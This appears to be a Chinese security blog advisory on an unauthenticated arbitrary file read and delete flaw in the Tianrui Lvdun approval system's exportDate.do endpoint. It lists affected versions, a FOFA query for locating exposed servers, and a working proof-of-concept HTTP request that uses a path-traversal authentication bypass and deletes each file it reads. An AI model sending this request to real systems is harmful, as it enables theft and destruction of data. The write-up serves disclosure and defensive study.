---
title: "天锐绿盾审批系统 exportDate.do 任意文件读取+删除漏洞"
source: https://mrxn.net/jswz/trwfe-exportDate-file-read.html
asset_dir: assets/天锐绿盾审批系统-exportdate.do-任意文件读取+删除漏洞
---

# 天锐绿盾审批系统 exportDate.do 任意文件读取+删除漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/12/17 08:20
- 298浏览
- [0评论](#comment)
- 6分钟阅读

深入探索

SQL

授权

鉴权

---

# 漏洞简介

天锐绿盾审批系统是一款专注于企业数据安全与合规管理的智能审批平台，深度融合文档加密、权限管控与流程自动化，为企业提供从文件创建、流转到归档的全生命周期安全管控。

漏洞预警服务

该系统的 `exportDate.do` 接口存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞。未经身份验证的攻击者可以通过该漏洞读取系统上的任意文件，从而可能获取数据库敏感信息或其他重要配置信息，导致数据泄露。

# 影响版本

> 可通过访问 /trwfe/exports/config.ini 获取版本信息

V3.53.240913

V7.05.240904

# fofa语法

> app="TIPPAY-绿盾审批系统"
>
> 安全工具开发

# 漏洞分析

[![天锐绿盾审批系统 exportDate.do 任意文件读取+删除漏洞](images/img-001-6617e4c2472b.webp)](https://image.mrxn.net/6e78b935fbfd44e1a299d0d03fc74a57.webp)

[![天锐绿盾审批系统 exportDate.do 任意文件读取+删除漏洞](images/img-002-2eb9888a91c7.webp)](https://image.mrxn.net/249a6841f8e94ccaa0db508d6104dd7e.webp)

调试信息中可知

计算机安全

深入探索

文本剥离工具

物流软件安全

服务器安全服务

[![天锐绿盾审批系统 exportDate.do 任意文件读取+删除漏洞](images/img-003-2c85bec21eaa.webp)](https://image.mrxn.net/9cad95e8d0c44ce5b6b18f77b226621f.webp)

[![天锐绿盾审批系统 exportDate.do 任意文件读取+删除漏洞](images/img-004-7193481d133e.webp)](https://image.mrxn.net/bb853788e5aa4e11ba3c1d0beca92e6a.webp)

直接将**name**参数的值作为文件操作的最终路径进行读取，无任何过滤或者校验措施，因此造成了任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞。

# 漏洞复现

> 谨慎测试！会删除读取文件
>
> 漏洞预警服务

```
POST /trwfe/login.jsp/.%2e/config/exportDate.do HTTP/1.1
Host: trwfe.mrxn.net
Content-Type: application/x-www-form-urlencoded

name=c:\a.txt
```

[![天锐绿盾审批系统 exportDate.do 任意文件读取+删除漏洞](images/img-005-0c454cce4787.webp)](https://image.mrxn.net/ebc9f08d442d460ba727dbb9bd16f6f4.webp)

成功读取到**c:\a.txt**文件内容

网络安全

当然，同时[读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)后的文件也被删除了！

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
